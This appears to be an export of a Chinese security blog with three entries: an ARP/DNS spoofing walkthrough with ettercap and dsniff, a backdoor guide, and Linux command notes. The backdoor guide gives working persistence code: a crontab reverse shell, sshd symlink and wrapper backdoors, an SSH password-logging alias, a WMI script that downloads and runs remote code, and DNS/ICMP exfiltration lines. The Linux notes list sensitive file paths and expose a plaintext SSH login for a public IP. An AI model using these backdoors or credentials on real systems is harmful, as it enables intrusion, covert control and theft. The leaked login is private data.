    <content type="text"><![CDATA[概述操作一波中间人攻击的ARP毒化与DNS欺骗，备忘。 准备测试机子如下 ： 攻击者：192.168.111.183被欺骗主机：192.168.111.173默认网关（_gateway）：192.168.111.2 ARP毒化查看arp表 1234root@kali:~# arpAddress HWtype HWaddress Flags Mask Iface192.168.111.254 ether 00:50:56:fe:53:af C eth0_gateway ether 00:50:56:e6:26:42 C eth0 开启转发 12345root@kali:~# cat /proc/sys/net/ipv4/ip_forward0root@kali:~# echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forwardroot@kali:~# cat /proc/sys/net/ipv4/ip_forward1 EttercapEttercap是一个多用途的开源工具，可以用来执行嗅探、密码抓取、主机分析等，并且还可以图形化启动。 另外ettercap有些不错的插件，可以增强中间人攻击。 12345dns_spoof (执行DNS欺骗攻击)Dos_attack(对受害主机进行拒绝服务攻击)Chk_poison(检测是否成功进行了攻击)Repoison_arp(顾名思义，修复ARP)...... 具体操作如下： 123root@kali:~# ettercap -G // 图形化启动ettercaproot@kali:~# ettercap -T -q -M ARP // 对所有主机进行ARP欺骗root@kali:~# ettercap -T -q -M ARP -A 192.168.111.173 // 对192.168.111.173进行欺骗 查看受害者主机的arp表会发现，网关的mac地址被替换成了攻击机的mac地址。 DsniffDsniff是一个非常强大的工具套件，它被用来进行渗透测试。它被用来实施嗅探、网络分析等。它能够捕捉各种协议。ARPspoof和driftnet也是dsniff套件的一部分，当然还有其他套件，如： 12345MsgsnarfUrlsnarfMailsnarfFilesnarfdnsspoof arpspoof重定向受害者的流量传送给攻击者。1234root@kali:~# arpspoof -i eth0 -t 192.168.111.173 192.168.111.20:c:29:eb:ff:b9 0:c:29:d0:84:fc 0806 42: arp reply 192.168.111.2 is-at 0:c:29:eb:ff:b90:c:29:eb:ff:b9 0:c:29:d0:84:fc 0806 42: arp reply 192.168.111.2 is-at 0:c:29:eb:ff:b9...... arpspoof网关的数据重定向到攻击者的机器。（流量由网关到攻击者再到受攻击者）1234root@kali:~# arpspoof -i eth0 -t 192.168.111.2 192.168.111.1830:c:29:eb:ff:b9 0:50:56:e6:26:42 0806 42: arp reply 192.168.111.183 is-at 0:c:29:eb:ff:b90:c:29:eb:ff:b9 0:50:56:e6:26:42 0806 42: arp reply 192.168.111.183 is-at 0:c:29:eb:ff:b9...... 截获敏感信息12root@kali:~# driftnet -i eth0 // 截获图片root@kali:~# dsniff -i eth0 // 截获密码 DNS毒化DNS欺骗攻击是一种非常危险的中间人攻击，它容易被攻击者利用并且窃取用户的机密信息。使用DNS欺骗中间人攻击，攻击者将截取会话，然后转移到一个假网站的会话。假如：用户希望访问baidu.com，并且谷歌的IP地址为220.181.57.216，攻击者就可以使用DNS欺骗技术拦截会话，并将用户重定向到假冒的网站，假网站IP可以为任意IP。 Ettercapettercap包含一个DNS插件，可以进行DNS欺骗攻击。 在服务器上开启web服务。 查找编辑etter.dns文件，并在里面添加需要进行欺骗网站域名： 123root@kali:~# find / -name etter.dns/etc/ettercap/etter.dnsroot@kali:~# vim /etc/ettercap/etter.dns 比如将google.com的ip导向118.24.150.108 123google.com A 118.24.150.108 *.google.com A 118.24.150.108 www.google.com PTR 118.24.150.108 然后启动 1root@kali:~# ettercap -G 点击上方菜单的Sniff，选择Unified sniffing，并选择网卡。 点击上方菜单的Hosts，选择Scan for hosts，进行主机扫描。 点击上方菜单的Hosts，选择Hosts list，进行选择目标主机为target1，选择网关为target2。 点击上方菜单的Mitm，选择ARP Poisoning，然后勾选Sniff remote connections。 点击上方菜单的Plugins，选择Manage the plugins，然后勾选dns_spoof以及remote browser,当然还有其他插件，根据需求选择。 目标主机访问此域名google。 参考资料中间人攻击-ARP毒化中间人攻击-DNS毒化]]></content>
      <categories>
        <category>spoof</category>
      </categories>
      <tags>
        <tag>arpspoof</tag>
        <tag>dnsspoof</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Backdoor 基础]]></title>
    <url>%2F2017%2F01%2F21%2Fbackdoor-base%2F</url>
    <content type="text"><![CDATA[概述 没有最好的后门，只有最合适的后门。 在整体架构上，一个优秀的后门应该充分考虑其功能、触发方式和通信方式等方面。针对不同的方面，杀软也会根据其特征进行处理。为了进一步的持续性控制以及后渗透，后门越显复杂化。从后门的发展史中可看出，这是一场攻与防的持续性较量，简单来说，渗透测试拿下服务器后，怎么能不留后门呢。当然，这是玩笑话。 分类 终端平台：Linux型、Windows型和IOT型； Linux：配置型、logger型和rookit型； Windows：Registry型、Schtasks型和WMI型； 通信方式：http/https型、irc型、dns型、icmp型等。 网站应用：模块扩展型、后端语言型和配置文件型。 终端平台Linux配置型这里的配置型是指借助Linux系统本身的一些特性来完成后门布置功能。 crontab运维经常会用到该命令，这相当于windows的计划任务，规定时间来执行指定命令。这通常与反弹shell一起运用。 1$ (crontab -l;printf "*/5 * * * * exec9&lt;&gt; /dev/tcp/localhost/8080&amp;&amp;exec0&lt;&amp;9&amp;&amp;exec1&gt;&amp;92&gt;&amp;1&amp;&amp;/bin/bash --noprofile –I;\rno crontab for `whoami`%100c\n")|crontab - ssh公钥免密将客户端生成的ssh公钥写到所控服务器的~/.ssh/authorized_keys中，然后客户端利用私钥完成认证即可登录。 123$ ssh-keygen -t rsa$ lsid_rsa id_rsa.pub 把id_rsa.pub写入服务端的authorized_keys中，并修改好相应权限。 12$ chmod 600 ~/.ssh/authorized_keys$ chmod 700 ~/.ssh 这种后门的特点是简单易用，但在实战中会被服务器的配置环境所限制，以及容易被发现。 软连接后门1$ ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=5555; 经典后门。直接对sshd建立软连接，之后用任意密码登录即可。 1ssh root@x.x.x.x -p 5555 但这隐蔽性很弱，一般的rookit hunter这类的防护脚本可扫描到。 SSH Server wrapper123456789101112$ cd /usr/sbin/$ mv sshd ../bin$ vim sshd#!/usr/bin/perlexec"/bin/sh"if(getpeername(STDIN)=~/^..LF/);exec&#123;"/usr/bin/sshd"&#125;"/usr/sbin/sshd",@ARGV;``` 赋予权限chmod 755 sshd，最后正向连接：``` bashsocat STDIO TCP4:target_ip:22,sourceport=19526 其中，\x00\x00LF是19526的大端形式，便于传输和处理。原理是从sshd fork出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行了判断。隐蔽性比刚刚介绍的软连接后门要好。 logger型alias这种通过替换命令来使得evil效果最大化的用法，一般是通过追踪ssh的系统调用比如read、write等来记录下ssh的操作。 1alias ssh=&apos;strace -o /tmp/sshpwd-`date &apos;+%d%h%m%s&apos;`.log -e read,write,connect -s2048 ssh&apos; 当然，这只是alias后门的一种用法，可根据具体情况举一反三。 pampam是一种认证机制，它可帮助管理员快速方便地配置认证方式，并且无需更改服务程序。这种后门主要是通过pam_unix_auth.c打补丁的方式潜入到正常的pam模块中，以此来记录管理员的帐号密码。搭建方式见下连接。 openssh后门同理，也是下载对应的恶意补丁包，来记录管理员的帐号密码。但该后门与pam后门存在很大的问题是编译环境，有时在实战中会出现各种各样的问题。搭建方式见下连接。 rookit应用级rootkit应用级rookit的主要特点是通过批量替换系统命令来实现隐藏，如替换ls、ps和netstat等命令来隐藏文件、进程和网络连接等，有时会有守护进程来保证后门的稳定性。推荐两款常用的木马：mafix和brookit。如果想要学习linux类木马，推荐阅读orange的tsh源码，基本上涵盖了常规木马应具有的特点。 内核级rookit隐藏性通常要借助对linux系统调用的截获来达到目的，并且难以查杀，难以清除，危害巨大。由于未找到相应例子，遂不做具体分析。 windowswindows后门博大精深，实在不好分类，因为后门常需持久化潜在运行，受到powersploit中persistence脚本的启发，因此采取使用后门的触发方式进行分类，分为registry型、schtasks型和WMI型。 registry型在一般用户权限下，通常是将要执行的后门程序或脚本路径填写到如下注册表的键值中HKCU:Software\Microsoft\Windows\CurrentVersion\Run，键名任意。普通权限即可运行。 不过这老生长谈的后门早已被用烂，360杀软会弹框提示。 schtasks型该类型后门可分为管理员权限和普通用户权限，管理员权限可以设置更多的计划任务，比如重启后运行等。 1schtasks /Create /SC HOURLY /TN Updater /TR $CommandLine 这里比较大的限制是策略问题，只能按照规定的时间来执行相关程序或命令。通常来讲，持久性的APT对于这点要求较高。 WMI型Defcon23的演讲后，WMI型后门的热度在国外迅速蔓延。（强烈推荐使用该类型后门）它是只能由管理员权限运行的后门，一般是用powershell编写。目前以这一触发方式运行的后门是不会引起杀软任何反映的。具体原理可到drops去了解。 该类型后门主要用到了WMI展现出来的两个特征：无文件和无进程。 将core code加密存储于WMI类的property中，而该位置在复杂的CIM 数据库中，这达到了所谓的无文件；将filter和consumer异步绑定在一起，当规定的filter满足条件时，比如间隔1min，那么系统会自动启动一进程（名称为powershell）去执行consumer（后门程序）中的内容，当执行完成后，进程会消失，持续的时间根据后门运行情况而定，一般是几秒，这达到了所谓的无进程。 上述三类的详情代码请参考powersploit现阶段无论再复杂的WMI后门都是围绕上面两点而展开的，最核心的是后者。 下面是比较典型的代码，功能为每分钟执行下载并执行： 1234567891011121314151617181920212223242526272829$Name = &apos;test&apos;# build the filter$TimeExecTime = 60$Query = &quot;SELECT * FROM __InstanceModificationEvent WITHIN$TimeExecTime WHERE TargetInstance ISA &apos;Win32_PerfFormattedData_PerfOS_System&apos;&quot;$NS = &quot;root\subscription&quot;$FilterArgs = @&#123; Name=$Name EventNameSpace=&quot;root\cimv2&quot; QueryLanguage=&quot;WQL&quot; Query=$Query&#125;$Filter = Set-WmiInstance -Namespace $NS -Class &quot;__EventFilter&quot; -Arguments $FilterArgs# build the consumer$ConsumerName = $Name$command = &quot;`$wc = New-Object System.Net.Webclient; `$wc.Headers.Add(&apos;User-Agent&apos;,&apos;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) Like Gecko&apos;); `$wc.proxy = [System.Net.WebRequest]::DefaultWebProxy; `$wc.proxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; IEX (`$wc.DownloadString(&apos;$URL&apos;))&quot;#$encCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))$commandLine = &quot;C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -NoP -NonI -w hidden -Command $command&quot; $ConsumerArgs = @&#123; Name=$ConsumerName CommandLineTemplate=$commandLine&#125;$consumer = Set-WmiInstance -Class &quot;CommandLineEventConsumer&quot; -Namespace $NS -Arguments $ConsumerArgs#Bind filter and consumer$Args = @&#123; Filter = $Filter Consumer = $consumer&#125;Set-WmiInstance -Class &quot;__FilterToConsumerBinding&quot; -Namespace &quot;root\subscription&quot; -Arguments $Args IOT物联网的脆弱性因Mirai恶意软件的肆用而不断凸显，特别是弱口令的泛滥、致使了大批物联网设备沦陷。其中造成的危害不言而喻，不但可以耗用其资源，更可怕的是可能利用设备本身的功能造成意料不到的伤害。如果单单从技术的角度上讲，Mirai确实是一款非常优秀的恶意软件。在这里，我们只讨论它们的后门特性： 进程对于运行时进程的处理，Mirai采用的是进程名随机，也算是为了不被特征提取所采取的一个措施。 http://p9.qhimg.com/t0147848fcfcfd59340.png 防重启因为IOT设备的特殊性，无法将程序写进设备中，只能驻留在内存里，所以需不能使设备重启。在固件里，有一进程会不断向watchdog进程发送一字节数据，如果没有该操作，设备则会重启。Mirai采取的是关闭watchdog的功能。 http://p4.qhimg.com/t01e96433fc3208ba2b.png 通信协议该过程可以分为上线过程：bot发送\x00\x00\x00\x01，得到回应后再发送\x00；心跳过程：bot间隔60s发送\x00\x00cnc，cnc回应\x00\x00；解析执行：cnc对bot发出的指令里采取了一定的格式。[target_num] 02 [IP] 08 08 08 08 [MASK] 20 [IP] 07 07 07 07 [MASK] 20….. IOT设备后门的重点往往是在其功能的实现上，而不是在后门的persistence上，因为IOT设备一旦被突破，几乎入无人之境，恶意软件会合理地最大化利用其中的资源。 通信方式类后门的网络通信行为同样是防火墙的侦查重点，在复杂的实际环境下，怎么把被控端的数据回传成为了一个难点。对于不同的防火墙，其使用的策略也有些不同。 http/https型目前可以说这是最流行的通信方式，可借用第三方的api来实现回连功能，从很大程度上讲解决了很多困难。像在github star比较高的，如twittor、gcat等，从代码上看不会有太大问题，主要是完成了对相应第三方应用的api调用以及功能的实现，但是这种第三方选取并不合理，它会造成溯源十分容易。先不论gmail的实名制，问题的关键在于被控端只能共享一个或几个gmail帐号，当其中一个被控端被追查后，其它的被控端很可能就处于危险状态。 根据经验来看，如果真要借助第三方的网站来完成通信，比较常用的是论坛、网盘等，可以将被控端各自的权限分离开来。在很多APT报告中，我们可看到dropbox及reddit快成为远控木马的重灾区，官方当然也出台了一些措施来制止这种行为。 这部分木马可参考nishang框架中的HTTP-Backdoor脚本。 总的来讲，这种适合于比较小型的，不适合于大型僵尸网络。在国内这种类型的网站基本需要实名制，以官方的力量来追踪是十分容易的。危害小则被封号，大则查水表。 目前对于追踪的问题主流采取的是DGA(Domain Generation Algorithm)，自建服务器。 攻击者和被控段以同样的算法和种子算出一系列域名，种子的约定可以是日期，可以是天气等。攻击者注册其中的一个或多个域名。这样的好处是反汇编难度大，算法不易被破解。即使被破解了，安全人员还需抢在攻击者之前及时注册生成的大量域名，费时费钱费力。 更多详细的可参考《C&amp;C控制服务的设计和侦测方法综述》 irc型irc的木马优点很多，比如管理方便，便于远控协调分工，channel隐藏，追溯难。缺点很明显，国内只有较少的用户使用irc，用户防火墙可能会拦截该流量，具体情况根据地区而定。关于这部分irc木马的中文实例资料可参考 icmp型ICMP通信协议中可看到在最后空余了很大的data段，名为数据缓冲区，可填充60000多字节。因此，可将被控端得到的数据放入其中： 1234$cmd = ls;$timeout = 1000;$server_ip = 'xxxx';(New-Object System.Net.NetworkInformation.Ping).Send($server_ip, $timeout, $cmd) 在server_ip上抓包可看到返回结果。 dns型DNS原理在这不过多展开，这种类型的逃逸方法一般是用自己申请的域名，将NS记录指向搭建的NS服务器上，使用DNS泛解析，把用户所查询关于该域名的信息记录下来。 1$ ping -c 2 `whoami`.xxxx.ceye.io 1$ nslookup -querytype=txt $data.ns.lynahex.com 8.8.8.8 不过使用如上的常规方法，似乎会对data长度有限制。自建NS服务器的源码可看NoEye（题外话：有的厂商从数据库中查询指定域名的txt记录时并未过滤，可能会有sql注入。:-D。） 该类流行的木马可参考dnscat2,它涉及了更底层的包构造，即使没有域名，也可使用该协议进行通信。 具体用法 总的来说，这类后门依赖于上层协议，符合人们常用协议的范围，同时，攻击者也在探寻新兴的协议来exfiltrate。 网站类传统的后门中自然少不了该类型，从用户发出数据请求开始到最终落入网站的数据库中，经过服务端的每一环节都有可能成为攻击者利用的地方。 模块扩展型中间件之所以能被利用，是因为它们的可扩展性，当布置完模块或插件时，中间件无法判断开发者的行为是否为恶意。 apache将后门增加到apache模块目录中，攻击者只需要简单地发起一个请求就可拿到root权限的shell，并且没有任何日志记录。最出名的莫过于mod_rootme 具体操作可参考 ginxnginx占有内存少，并发能力强，受到很多用户的喜爱。它可很方便地添加和升级模块，同理，pwnginx作为经典的后门也是应用了该原理，程序员只需将正常的功能稍微改动，就能达到另一面的效果。 iisiis后门是用了iis本身的机制，当在http头里增加一字段即可触发后门，并执行发过来的命令。具体原理和操作可参考中间件的后门大多是以类似上述原理为基础的。 PHP扩展库同理，将编译好的so文件添加到php.ini的extension中。当模块被初始化时，会去加载执行我们的代码。当发送特定参数的字符串过去时，即可触发后门。 后端语言型这类后门在新型框架和语言的兴起下，影响力有些稍稍减弱。主要原因是现主流框架都采取路由的方式来映射url，有时攻击者即使上传完后门，也有可能无法找到对应的路由映射方式。站在不同人群的角度来看后门也别有一番风情。下面分为开发者后门和攻击者使用的后门，其中针对攻击者的后门是以PHP为例。 开发者后门有时开发者也会在代码中留下后门，比如x博CMS。它通常是一些奇怪的代码，稍微动态调试下可分析出后门，这是属于比较低级的，更高级的的后门是逻辑和理论相关的漏洞，在defcon23上进行的“卑鄙密码竞赛”，曾经wooyun有介绍，有的参赛者将密码学的知识和PHP特性相结合，并以一定的逻辑性代码迷惑大多数人。虽然不难，但能想出这点子实在难能可贵。更为有趣的是，即使被发现了也可当作是个漏洞处理，舆论不会偏向于说这是开发者留下的后门。 另外一方面，后门不一定直接出现在产品中，可能也会存在库中或编译好的文件里，比如nodesjs仓库或pyc后门。 PHP后门随着时代的变迁，木马的重心也随着转移。前10年里，PHP马看重的是功能，而如今则是免杀以及绕waf的能力，具体来说，指的是木马静态文件的免杀和通信流量的无特征。 在实战中，主要采取的方法为混淆编码、字符替换等，还可利用解释性语言的特性以及其回调机制。对于通信流量方面，一般采取对称加密，如DES，而不是编码等。比较成熟的后门是weevely，也可根据需求将菜刀完善，把流量加密。 配置文件型该类型后门主要是通过阅读相关官方文档来挖掘发现，主要应用场景是bypass上传文件的黑名单。以PHP语言为例： .htaccess后门在.htaccess中添加php解析的新后缀并上传，之后上传该后缀的木马即可。 1AddType application/x-httpd-php .abc .user.ini后门.user.ini相当于用户自定义的php.ini。 上传.user.ini，其中的内容为： 1auto_prepend_file=xx.gif 可以让该目录下的所有php文件自动包含xx.gif，我们直接上传xx.gif作为木马。不过较大的限制是该目录下必须要有正常的php文件才能使得xx.gif中的代码执行。 总结当然，上面的这些都是大牛们总结的，我只是个搬运工。]]></content>
      <categories>
        <category>backdoor</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>backdoor</tag>
        <tag>linux</tag>
        <tag>iot</tag>
        <tag>protocol</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 基础知识]]></title>
    <url>%2F2016%2F12%2F22%2Flinux-base%2F</url>
    <content type="text"><![CDATA[概述记录一下Linux的常用命令，方便查询。 持续更新中。 目录基本目录12345678910111213141516171819202122232425262728/var (variable)：与系统运作过程有关。/var/log/ 日志/dev 驱动 比要重要的档案有/dev/null, /dev/zero, /dev/tty, /dev/lp*, /dev/hd*, /dev/sd*等等/usr (软件放置处)/usr/local 系统管理员在本机自行安装自己下载的软件/usr/share/doc 说明文件档/opt (第三方协力软件)/etc (配置文件) /etc/init.d/：所有朋务的预设启动 script 都是放在这里的。 例如要启动或者关闭 iptables 的话：『 /etc/init.d/iptables start』、『/etc/init.d/iptables stop』/boot (开机与核心档) Linux kernel常用的档名为：vmlinuz，如果使用的是grub这个开机管理程序， 则还会存在/boot/grub/这个目录喔！/bin 系统有很多放置执行文件的目录，但/bin比较特殊。 因为/bin放置的是在单人维护模式下还能够被操作的指令。在/bin底下的指令可以被root不一般账号所使用，主要有：cat, chmod, chown, date, mv, mkdir, cp, bash等等常用的指令。/home 这是系统默认的用户家目录(home directory)。/lib 系统的函式库/media 可移除的装置啦！ 包括软盘、光盘、DVD等等装置都暂时挂载在这。/mnt 如果你想要暂时挂载某些额外的装置，一般建议你可以放置到这个目录中。/srv 是一些网络朋务启动后，这些服务所需要取用的数据目录。/tmp 暂时放置档案的地方。/lost+found 这个目录是使用标准的ext2/ext3文件系统格式才会产生的一个目录，目的在二当文件系统发生错误时， 将一些遗失的片段放置到这个目录下。这个目录通常会在分割槽的最顶层存在， 例如你加装一颗硬盘于/disk中，那在这个系统下就会自动产生一个这样的目录『/disk/lost+found』/proc 他放置的数据都是在内存当中， 例如系统核心、行程信息(process)、周边装置的状态及网络状态等等。因为这个目录下的数据都是在内存当中， 所以本身不占任何硬盘空间啊！比较重要的档案例如：/proc/cpuinfo, /proc/dma, /proc/interrupts, /proc/ioports, / proc/net/* 等等。/sys 这个目录其实跟/proc非常类似，也是一个虚拟的文件系统，主要也是记录不核心相关的信息。 包括目前已加载的核心模块不核心侦测到的硬件装置信息等等。这个目录同样不占硬盘容量喔！/sbin 重要的系统执行文件 常见路径Linux 系统下的一些常见路径： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147/etc/passwd/etc/shadow/etc/fstab/etc/host.conf/etc/motd/etc/ld.so.conf/var/www/htdocs/index.php/var/www/conf/httpd.conf/var/www/htdocs/index.html/var/httpd/conf/php.ini/var/httpd/htdocs/index.php/var/httpd/conf/httpd.conf/var/httpd/htdocs/index.html/var/httpd/conf/php.ini/var/www/index.html/var/www/index.php/opt/www/conf/httpd.conf/opt/www/htdocs/index.php/opt/www/htdocs/index.html/usr/local/apache/htdocs/index.html/usr/local/apache/htdocs/index.php/usr/local/apache2/htdocs/index.html/usr/local/apache2/htdocs/index.php/usr/local/httpd2.2/htdocs/index.php/usr/local/httpd2.2/htdocs/index.html/tmp/apache/htdocs/index.html/tmp/apache/htdocs/index.php/etc/httpd/htdocs/index.php/etc/httpd/conf/httpd.conf/etc/httpd/htdocs/index.html/www/php/php.ini/www/php4/php.ini/www/php5/php.ini/www/conf/httpd.conf/www/htdocs/index.php/www/htdocs/index.html/usr/local/httpd/conf/httpd.conf/apache/apache/conf/httpd.conf/apache/apache2/conf/httpd.conf/etc/apache/apache.conf/etc/apache2/apache.conf/etc/apache/httpd.conf/etc/apache2/httpd.conf/etc/apache2/vhosts.d/00_default_vhost.conf/etc/apache2/sites-available/default/etc/phpmyadmin/config.inc.php/etc/mysql/my.cnf/etc/httpd/conf.d/php.conf/etc/httpd/conf.d/httpd.conf/etc/httpd/logs/error_log/etc/httpd/logs/error.log/etc/httpd/logs/access_log/etc/httpd/logs/access.log/home/apache/conf/httpd.conf/home/apache2/conf/httpd.conf/var/log/apache/error_log/var/log/apache/error.log/var/log/apache/access_log/var/log/apache/access.log/var/log/apache2/error_log/var/log/apache2/error.log/var/log/apache2/access_log/var/log/apache2/access.log/var/www/logs/error_log/var/www/logs/error.log/var/www/logs/access_log/var/www/logs/access.log/usr/local/apache/logs/error_log/usr/local/apache/logs/error.log/usr/local/apache/logs/access_log/usr/local/apache/logs/access.log/var/log/error_log/var/log/error.log/var/log/access_log/var/log/access.log/usr/local/apache/logs/access_logaccess_log.old/usr/local/apache/logs/error_logerror_log.old/etc/php.ini/bin/php.ini/etc/init.d/httpd/etc/init.d/mysql/etc/httpd/php.ini/usr/lib/php.ini/usr/lib/php/php.ini/usr/local/etc/php.ini/usr/local/lib/php.ini/usr/local/php/lib/php.ini/usr/local/php4/lib/php.ini/usr/local/php4/php.ini/usr/local/php4/lib/php.ini/usr/local/php5/lib/php.ini/usr/local/php5/etc/php.ini/usr/local/php5/php5.ini/usr/local/apache/conf/php.ini/usr/local/apache/conf/httpd.conf/usr/local/apache2/conf/httpd.conf/usr/local/apache2/conf/php.ini/etc/php4.4/fcgi/php.ini/etc/php4/apache/php.ini/etc/php4/apache2/php.ini/etc/php5/apache/php.ini/etc/php5/apache2/php.ini/etc/php/php.ini/etc/php/php4/php.ini/etc/php/apache/php.ini/etc/php/apache2/php.ini/web/conf/php.ini/usr/local/Zend/etc/php.ini/opt/xampp/etc/php.ini/var/local/www/conf/php.ini/var/local/www/conf/httpd.conf/etc/php/cgi/php.ini/etc/php4/cgi/php.ini/etc/php5/cgi/php.ini/php5/php.ini/php4/php.ini/php/php.ini/PHP/php.ini/apache/php/php.ini/xampp/apache/bin/php.ini/xampp/apache/conf/httpd.conf/NetServer/bin/stable/apache/php.ini/home2/bin/stable/apache/php.ini/home/bin/stable/apache/php.ini/var/log/mysql/mysql-bin.log/var/log/mysql.log/var/log/mysqlderror.log/var/log/mysql/mysql.log/var/log/mysql/mysql-slow.log/var/mysql.log/var/lib/mysql/my.cnf/usr/local/mysql/my.cnf/usr/local/mysql/bin/mysql/etc/mysql/my.cnf/etc/my.cnf/usr/local/cpanel/logs/usr/local/cpanel/logs/stats_log/usr/local/cpanel/logs/access_log/usr/local/cpanel/logs/error_log/usr/local/cpanel/logs/license_log/usr/local/cpanel/logs/login_log/usr/local/cpanel/logs/stats_log/usr/local/share/examples/php4/php.ini/usr/local/share/examples/php/php.ini/usr/local/tomcat5527/bin/version.sh/usr/share/tomcat6/bin/startup.sh/usr/tomcat6/bin/startup.sh 开机流程简单的说，整个开机流程到操作系统之前的动作应该是这样的： BIOS：开机主动执行的韧体，会认识第一个可开机的装置； MBR：第一个可开机装置的第一个扇区内的主要启动记录区块，内吨开机管理程序； 开机管理程序(boot loader)：一支可读叏核心档案来执行的软件； 核心档案：开始操作系统的功能… 文件属性123456789101112drwxr-xr-x 16 root root 4096 Aug 6 22:01 ImageMagick[ 权限 ] [连结] [拥有者] [群组][档案容量] [ 修改日期 ] [ 文件名 ] d rwx r-x r-x[ 文件类型 ] [ 文件拥有者 ] [ 文件所属组 ] [ 其他人权限 ]第一个字符代表这个档案是『目录、档案或链接文件等等』：* 当为[ d ]则是目录，例如上表档名为『.gconf』的那一行；* 当为[ - ]则是档案，例如上表档名为『install.log』那一行；* 若是[ l ]则表示为连结档(link file)；* 若是[ b ]则表示为装置文件里面的可供储存的接口讴备(可随机存取装置)；* 若是[ c ]则表示为装置文件里面的串行端口讴备，例如键盘、鼠标(一次性读取装置)。 权限对目录的重要性可读表示具有读取目录结构列表的权限，所以当你具有读取(r)一个目录的权限时，表示你可以查询该目录下的文件名数据。 所以你就可以利用 ls 这个指令将该目录的内容列表显示出来！ 可写这个可写入的权限对目录来说，是很里不起起的！ 因为他表示你具有移动该目录结构列表的权限，也就是底下这些权限： 建立新的档案与目录； 删除已经存在的档案与目录(不论该档案的权限为何！) 将已存在的档案或目录进行更名； 搬移该目录内的档案、目录位置。总之，目录的w权限就与该目录底下的文件名异动有关就对了啦！ 执行目录只是记录文件名而已，总不能拿来执行吧？没错！目录不可以被执行，目录的x代表的是用户能否迚入该目录成为工作目录的用途！所谓的工作目录(work directory)就是你目前所在的目录啦！举例来说，当你登入Linux时， 你所在的家目录就是你当下的工作目录。而变换目录的命令是『cd』(change directory)啰！ 工作目录对于指令的执行是非常重要的，如果你在某目录下不具有x的权限， 那么你就无法切换到该目录下，也就无法执行该目录下的任何指令，即使你具有该目录的r的权限。 文件名限制在Linux底下，使用预设的Ext2/Ext3文件系统时，针对档案的档名长度限制为： 单一档案或目录的最大容许文件名为 255 个字符； 包函完整路径名称及目录 (/) 的完整档名为 4096 个字符。以及避免一些特殊字符比较好！例如底下这些：1* ? &gt; &lt; ; &amp; ! [ ] | \ &apos; &quot; ` ( ) &#123; &#125; 常用指令基础指令123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960date 显示日期cal 显示日历bc 计算器[Ctrl]-c 中断目前程序[Ctrl]-d 取代exit的输入info 指令说明man 指令说明whatis 指令说明shutdown 关机reboot 重启halt 重启poweroff 重启init 系统运作的模式 init 0 关机chgrp 改变档案所属群组chown 改变档案拥有者chmod 改变档案的权限, SUID, SGID, SBIT等等的特权cd 变换目录pwd 显示弼前目录mkdir 建立一个新的目录rmdir 删除一个空的目录cp (复制档案或目录)rm (移除档案或目录)mv (移动档案与目录，或更名)cat 由第一行开始显示档案内容tac 从最后一行开始显示，可以看出 tac 是 cat 的倒着写！nl 显示的时候，顺道输出行号！more 一页一页的显示档案内容less 不 more 类似，但是比 more 更好的是，他可以往前翻页！head 叧看头几行tail 叧看尾巳几行od 以二迚制的方式读取档案内容！touch 修改档案时间或建置新档umask 档案预设权限chattr (配置文件案隐藏属性) lsattr (显示档案隐藏属性) file 观察文件类型which (寻找『执行档』)whereis (寻找特定档案)locate 这是因为 locate 寻找的数据是由『已建立的数据库 /var/lib/mlocate/』 里面大的数据所搜寻到的，所以不用直接在去硬盘弼中存取数据find 不过由亍 find 在寻找数据得时后相当的操硬盘tar 压 缩：tar -jcv -f filename.tar.bz2 要被压缩的档案或目录名称 查 询：tar -jtv -f filename.tar.bz2 解压缩：tar -jxv -f filename.tar.bz2 -C 欲解压缩的目录type Bash shell 的内建命令grep 搜索指定字符串kill 杀死进程 ps 将某个时间点的程序运作情况撷取下来top 动态观察程序的变化pstree 查到程序相关性free 观察内存使用情况uname 查阅系统与核心相关信息uptime 观察系统启动时间与工作负载netstat 追踪网络或插槽文件vmstat 侦测系统资源变化lsof 列出被程序所开启的档案文件名pidof ：找出某支正在执行的程序的 PID 常用指令系统管理 fdisk fdisk -l 查看系统分区信息 fdisk fdisk /dev/sdb 为一块新的SCSI硬盘进行分区 chown chown root /home 把/home的属主改成root用户 chgrp chgrp root /home 把/home的属组改成root组 useradd 创建一个新的用户 groupadd 组名 创建一个新的组 passwd 用户名 为用户创建密码 passwd -d用户名 删除用户密码也能登陆 passwd -S用户名 查询账号密码 usermod -l 新用户名 老用户名 为用户改名 userdel–r 用户名 删除用户一切 service [servicename] start/stop/restart 系统服务控制操作 /etc/init.d/[servicename] start/stop/restart 系统服务控制操作# xshell上传下载： sudo apt-get instal lrzsz 上传：rz -E 下载：sz# ssh 22： sudo apt-get install openssh-server 开启：sudo /etc/init.d/ssh restart# mysql开启远程连接： mysql -u root -p use mysql GRANT ALL PRIVILEGES ON *.* TO &apos;root&apos;@&apos;%&apos; IDENTIFIED BY &apos;123456&apos; WITH GRANT OPTION; flush privileges;# find 命令： find .|xargs grep -ri &quot;IBM&quot; 查找目录下的所有文件中是否含有某个字符串,并且只打印出文件名 find /opt/ -name &quot;MyCProgram.c&quot; 用文件名查找文件 find /opt/ -iname &quot;MyCProgram.c&quot; 用文件名查找文件，忽略大小写 find /opt/ -maxdepth 3 -iname &quot;passwd&quot; 在opt目录下及其最大三层深度的子目录中查找passwd文件 find /opt/ -maxdepth 3 -iname &quot;SBLF.php&quot; -exec cat &#123;&#125; \ 查找文件并查看 find /opt/ -not -iname &quot;MyCProgram.c&quot; 相反匹配 find /opt/ -perm 755 -type f -exec ls -l &#123;&#125; \; 查找opt目录下755权限的文件并执行ls -l find /opt/ -empty 查找所有的空文件 find /opt/lampp/htdocs/ -newer /opt/lampp/htdocs/Trojan/lqx.php 查找在指定文件时间之后做了修改的文件# 远程链接 1).linux ssh ubuntu@115.159.50.234 密码:8KX3OuQkBhDRvE7 2).windows rdesktop 115.159.100.36 